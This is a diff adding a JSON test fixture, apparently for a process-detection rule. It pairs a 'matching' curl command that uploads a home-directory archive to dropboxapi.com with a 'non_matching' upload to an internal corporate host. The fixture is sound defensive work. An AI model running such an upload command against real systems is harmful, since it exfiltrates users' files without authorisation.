@@ -1,0 +1,10 @@
+{
+  "matching": {
+    "image": "/usr/bin/curl",
+    "cmdline": "curl -T /home/alice/archive.tar.gz https://dropboxapi.com/2/files/upload"
+  },
+  "non_matching": {
+    "image": "/usr/bin/curl",
+    "cmdline": "curl -T /srv/build/archive.tar.gz https://packages.corp.example/upload"
+  }
+}
